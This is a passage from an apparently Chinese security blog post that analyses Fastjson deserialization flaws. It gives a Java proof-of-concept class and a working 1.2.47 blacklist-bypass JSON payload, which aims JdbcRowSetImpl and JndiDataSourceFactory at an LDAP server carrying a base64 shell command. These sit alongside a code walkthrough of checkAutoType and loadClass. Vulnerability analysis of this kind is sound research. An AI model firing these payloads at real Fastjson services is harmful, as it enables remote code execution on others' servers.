<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;properties\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;initial_context\&quot;: \&quot;ldap://127.0.0.1:1389/Evil\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;data_source\&quot;: \&quot;1\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h3><blockquote>
<p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32（未开启AutoTypeSupport），1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47，此版本Payload能够绕过checkAutoType内的各种检测，原理是通过Fastjson自带的缓存机制将恶意类加载到Mapping中，从而绕过checkAutoType检测。</font></p>
</blockquote>
<p><font style="color:#000000;">这次的绕过问题依旧还是出现在ParserConfig#checkAutoType方法中，</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="comment">// 类名非空判断</span></span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 类名长度判断，不大于128不小于3</span></span><br><span class="line">        <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>; <span class="comment">//;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;  <span class="comment">//L</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">        <span class="comment">// 类名以 [ 开头抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 类名以 L 开头以 ; 结尾抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">                * PRIME;</span><br><span class="line">        <span class="comment">// autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 在对比 denyHashCodes 进行黑名单匹配</span></span><br><span class="line">                <span class="comment">// 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类</span></span><br><span class="line">                <span class="comment">// 则抛出异常</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试在 TypeUtils.mappings 中查找缓存的 class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试在 deserializers 中查找这个类</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果找到了对应的 class，则会进行 return</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TypeUtils.getAnnotation(clazz,JSONType.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">            <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> Feature.SupportAutoType.mask;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> <span class="built_in">this</span>.autoTypeSupport</span><br><span class="line">                || (features &amp; mask) != <span class="number">0</span></span><br><span class="line">                || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">在checkAutoType方法的代码中可以发现存在一个逻辑问题，即autoTypeSupport为true时，fastjson也会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且TypeUtils.mappings中没有该类的缓存时，才会抛出异常，就是这个逻辑导致了fastjson 1.2.32之前的版本将会受到autoTypeSupport的影响。</font></p>
<p><font style="color:#000000;">在autoTypeSupport为默认的false时，程序直接检查黑名单并抛出异常，这部分无法绕过。在这之前，程序会先在TypeUtils.mappings中和deserializers中尝试查找要反序列化的类，如果找到了，则就会return。</font><strong><font style="color:#000000;">因此，如果在mapping中缓存有待加载的恶意类，那么就可以绕过后autoTypeSupport为默认的false时的黑白名单检测。</font></strong></p>
<p><font style="color:#000000;">跟进一下TypeUtils#getClassFromMapping方法，其从mapping中获取类名，能向mapping中赋值的方法有TypeUtils#addBaseClassMappings和TypeUtils#loadClass。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734945627762-10b00bb7-a1c9-411c-b8fa-b27cdd038807.png"></p>
<p><font style="color:#000000;">其中，TypeUtils#addBaseClassMappings方法为无参方法，并且没有可控的参数。转向TypeUtils#loadClass方法，这个方法上文也提到了，主要就是在加载类之前对类名做一些检查和判断。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="comment">// 非空判断</span></span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 防止重复添加</span></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 className 是否以 [ 开头</span></span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 className 是否 L 开头 ; 结尾</span></span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中</span></span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">在loadClass(String className, ClassLoader classLoader, boolean cache)方法中有三个地方能够向mapping写入恶意类，其被loadClass(String className, ClassLoader classLoader)方法调用，并且该方法中cache默认为true。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734946177191-de2df3bb-e347-44c1-8a80-c5b82871699c.png"></p>
<p><font style="color:#000000;">继续跟进，发现被com.alibaba.fastjson.serializer.MiscCodec#deserialze方法调用。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734946529587-cfc2b592-0a18-489a-9f81-964d7cfe39b5.png"></p>
<p><font style="color:#000000;">当parser.resolveStatus为TypeNameRedirect时，会进入if语句，解析val中的内容放入objVal中，然后传入strVal中。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">    strVal = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">接着当class是Class.class时，将会调用loadClass方法，将strVal进行类加载并缓存。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Locale.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.toLocale(strVal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;2&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/Base64/L2Jpbi9zaCAtYyAnb3BlbiAtYSBDYWxjdWxhdG9yJw==&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">调试分析一下，第一次进入checkAutoType方法时，还没有加入mapping，由于deserializers在初始化时已经将Class.class进行了加载，因此使用findClass方法可以找到，绕过了后面AutoTypeSupport的检查。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734947418766-c2a9691d-adf6-4d4b-a480-948ac04dfe10.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734948910241-e17c27a1-7825-4dd1-8261-48a808d0ecdc.png"></p>
<p><font style="color:#000000;">接着调用com.alibaba.fastjson.serializer.MiscCodec#deserialze方法，解析json中val中的内容，并放入objVal中，然后调用TypeUtils#loadClass方法，将恶意类进行缓存。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949131722-9d7395da-0bc0-4e85-9539-e1a59ec35b28.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949291874-cfd88bd5-5ab3-4c27-83d8-cc980d49daa3.png"></p>
<p><font style="color:#000000;">后续以恶意类进行@type请求时，由于mapping中已经缓存了，即可绕过黑名单进行的阻拦。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949618443-a02004be-efee-43ee-b4cd-7e624f30d6b3.png"></p>
<h3 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson-1.2.68"></a>fastjson-1.2.68</h3><blockquote>
